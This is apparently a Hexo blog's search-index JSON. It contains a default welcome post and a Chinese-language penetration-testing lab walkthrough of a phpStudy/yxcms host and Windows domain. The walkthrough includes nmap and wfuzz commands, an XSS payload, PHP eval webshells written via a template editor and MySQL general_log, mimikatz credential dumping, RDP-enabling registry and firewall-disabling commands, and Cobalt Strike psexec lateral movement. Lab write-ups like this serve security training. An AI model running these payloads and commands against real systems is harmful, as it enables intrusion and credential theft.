{"posts":[{"title":"Hello World","text":"Welcome to Hexo! This is your very first post. Check documentation for more info. If you get any problems when using Hexo, you can find the answer in troubleshooting or you can ask me on GitHub. Quick StartCreate a new post1$ hexo new &quot;My New Post&quot; More info: Writing Run server1$ hexo server More info: Server Generate static files1$ hexo generate More info: Generating Deploy to remote sites1$ hexo deploy More info: Deployment","link":"/2025/12/09/hello-world/"},{"title":"","text":"hello-world","link":"/2025/12/09/%E6%88%91%E7%9A%84%E7%AC%AC%E4%B8%80%E7%AF%87Hexo%E5%8D%9A%E5%AE%A2/"},{"title":"","text":"先扫网段 1nmap -sn -PR -n 192.168.52.0/24 -sn: 跳过端口扫描，只确认是否在线-PR: 使用基于 ARP 协议的主机扫描，内网首选-n: 不进行反向 DNS 解析，可提高扫描速度 然后按级别到10扫端口 1sudo nmap -sS -sC -Pn -n -sV -p 1-65535 192.168.52.10 -sS: 使用 TCP SYN 半开放扫描 (必须使用 root 权限运行)-sC: 使用默认的脚本扫描，可扫描出更多信息 (比如网页标题)-Pn: 不进行活跃主机扫描，因为扫描对象已知是活跃主机-n: 不进行反向 DNS 解析，提高扫描速度-sV: 扫描服务版本信息-p 1-65535: 指定扫描的端口范围为所有 TCP 端口80端口 从上图可看出 192.168.52.10 主机开放了 80 端口，运行了 HTTP 服务，站点标题为 phpStudy，即使用小皮面板搭建的 web 站点。浏览器访问 http://192.168.1.10，可以看到 phpinfo.php 文件被展示了出来，可被收集到大量 PHP 配置信息： 2.1.3 站点目录扫描使用 wfuzz 来扫描 http://192.168.52.10/ 的站点目录： 1wfuzz -w /usr/share/wordlists/dirb/common.txt --hc 404 http://192.168.52.10/FUZZ -w /usr/share/wordlists/dirb/common.txt: 指定 wfuzz 使用 kali 内置的常见目录和文件名字典文件来爆破--hc 404: hide code 404，即当返回状态码为 404 (未找到) 时，wfuzz 不显示该结果192.168.52.10/FUZZ: FUZZ 为占位符，字典文件中的每一行都会替换掉 FUZZ，并将替换后的 URL 发送给服务器，然后分析服务器的 http 状态码 /phpadmin弱密码root.root 1wget http://192.168.52.10/beifen.rar 这里直接告诉我们后台地址了源码中也可以看到因为直接拿源码了太简单了在留言板/index.php?r=default/extend/index&amp;id=100023页面输入 12hello admin!!&lt;script&gt;alert(&quot;hacker&quot;)&lt;/script&gt; 构成xss 单击审核按钮，使该留言通过审核从而显示在留言板页面：然后用户界面就会弹窗了 yxcms 后台文件上传漏洞 登录到 yxcms 的后台，进入” 前台模板”，管理模板文件并新建模板文件，名称为 hack, 内容为 php 一句话木马: &lt;?php @eval($_POST['hack']);?&gt;: 但是不知道文件位置这里我们直接去但是我们有源码可以知道这个页面其他文件的位置yxcms\\protected\\apps\\default\\view\\default 得到文件路径 1http://192.168.52.10/yxcms/protected/apps/default/view/default/HACK.php 然我们直接去antsword连接 net sessionnet session 命令的核心作用是展示 “会话连接”，具体能查到以下关键信息： 远程计算机名称 / IP：显示哪个设备（比如另一台电脑、服务器）正在连接你的电脑。 连接类型：通常是 “Microsoft Windows Network”，即通过 Windows 网络共享建立的连接。 连接状态：显示连接是 “已建立” 还是 “断开” 等状态。 登录用户名：显示远程设备用哪个账号登录到你的电脑（仅部分场景显示）。 到phpadmin访问写一句话 1SELECT &quot;&lt;?php @eval($_POST['hack']);?&gt;&quot; INTO OUTFILE &quot;C:\\Users\\Administrator\\Desktop\\phpStudy\\WWW\\hack.php&quot;; 命令执行后出现了报错，提示 MySQL 服务器配置了 secure-file-priv 选项，限制了该命令的执行，执行以下命令查询该选项的状态： 1SHOW GLOBAL VARIABLES LIKE &quot;%secure%&quot;; 从上图可知 secure-file-priv 选项被设置为了 NULL, MySQL 服务器会禁止文件导入与导出功能。尝试使用以下命令修改 secure-file-priv 选项的值为空字符，使其不做目录限制: 1SET GLOBAL secure_file_priv = ''; 现在该变量为只读，无法修改尝试从 MySQL 命令执行日志下手，执行 SHOW GLOBAL VARIABLES LIKE &quot;%general_log%&quot;;，查看命令执行日志开关和日志文件路径： 12SET GLOBAL general_log=on; SET GLOBAL general_log_file='C:/Users/Administrator/Desktop/phpStudy/WWW/hack.php'; 命令执行会自动在命令后面加上注释提示返回结果。执行 SHOW GLOBAL VARIABLES LIKE &quot;%general_log%&quot;; 手动验证一下： 从上图可知修改成功。后面执行的所有 MySQL 命令都会被记录在网站根目录下的 hack.php 文件中 (只记录命令，不记录结果)，此时再执行以下命令将一句话木马记录到日志文件中： 1SELECT &quot;&lt;?php @eval($_POST['hack']);?&gt;&quot;; 内网打靶先传cs马🐎到服务器上，然后直接点鼠标就提权成功了 这里我们接看密码输入 1logonpasswords 得到上图后直接去就得到了密码从上图可以看到 administrator 用户的登录密码为 admin123!, 所属域为 god, 密码来源为 mimikatz 工具。 查询远程桌面控制 (RDP) 3389 端口是否启用： 1shell netstat -ano | findstr 3389 输出为空行，说明未启用，使用此命令开启 RDP： 1shell REG ADD HKLM\\SYSTEM\\CurrentControlSet\\Control\\Terminal&quot; &quot;Server /v fDenyTSConnections /t REG_DWORD /d 00000000 /f 操作成功，再次执行 shell netstat -ano | findstr 3389 验证结果： 启用成功。WIN+R 打开运行窗口输入 mstsc.exe 回车打开 RDP 客户端程序，使用 god/administrator 用户连接服务器的远程桌面：这里是GOD\\Administrator发现连接失败，namp扫一下 1nmap -Pn -n -p 3389 192.168.52.10 发现端口为 filtered 被过滤状态，说明可能存在防火墙拦截，执行 shell netsh advfirewall show allprofiles 命令查看防火墙状态： 从上图可看到防火墙状态为打开且拦截了入站数据，执行 shell netsh advfirewall set allprofiles state off 命令尝试关闭服务器的防火墙 (或者执行此命令单独放行 RDP 流量 netsh advfirewall firewall add rule name=&quot;Allow Remote Desktop&quot; action=allow dir=in protocol=TCP localport=3389)： 执行成功，再次验证配置：shell netsh advfirewall show allprofiles 成功关闭防火墙，再次尝试连接远程桌面： 连接成功，同时观察到桌面 (左上角) 上有 nmap 应用程序。 在 CS 中执行 shell ipconfig 从上图可看到服务器除了有和和攻击机同网段的 192.168.52.10/24 的外网 IP 以外，还有内网 IP192.168.52.143/24。 继续在 CS 中使用服务器自带的 nmap 扫描内网有哪些活跃主机：shell nmap -sn -PR -n 192.168.52.143/24。注意，此命令必须在 Administrator 用户的 beacon 控制台下执行，在 System 用户下无法执行，因为 System 用户无法正确读取到环境变量，除非使用命令的完整路径来执行，比如 shell &quot;C:\\Program Files (x86)\\Nmap\\nmap.exe&quot; -sn -PR -n 192.168.52.143/24: 1234567192.168.52.1192.168.52.141192.168.52.254192.168.52.2192.168.52.138192.168.52.10192.168.52.143 3.1.6 域成员身份确定由于前面已经确定 Win7 服务器所属域为 god, 因此另外两台活跃主机一定有一台是域控制器 DC, 使用 net view 命令 (注意不要加 shell 前缀，否则结果不完整) 探测域内主机： 1net view 从上图可看到 192.168.52.138 的主机名为 OWA(全称应该是 Outlook Web App)，为主域控制器 PDC (Primary Domain Controller),192.168.52.141 的主机名为 ROOT-TVI862UBEH, 和 Win7 服务器一样同属于 god 域的域成员。 命令执行完成后，CS 会自动将探测到的设备加入” 目标列表”(注意，图中的 198.18.*.* 为本地基准测试 IP，在这里无实际意义，不必在意): 3.1.7 域成员端口扫描在 CS 的 Administrator 用户的 beacon 控制台中依次执行以下两条命令来分别扫描 192.168.52.138 和 192.168.52.141 两台主机的端口状态： 12shell nmap -sS -sC -Pn -n -sV -p 1-65535 192.168.52.138 shell nmap -sS -sC -Pn -n -sV -p 1-65535 192.168.52.141 从上面两张图片中可以看出这两台主机都开放了 SMB 协议的 445 端口，那么接下来可以尝试使用 CS 内置的 psexec 工具获取目标的 system shell。 3.2 横向移动 创建一个 SMB 监听器，名字为 wxdx，Payload 为 Beacon SMB：","link":"/2025/12/09/%E6%89%93%E9%9D%B6%E7%AC%94%E8%AE%B0/"}],"tags":[],"categories":[],"pages":[]}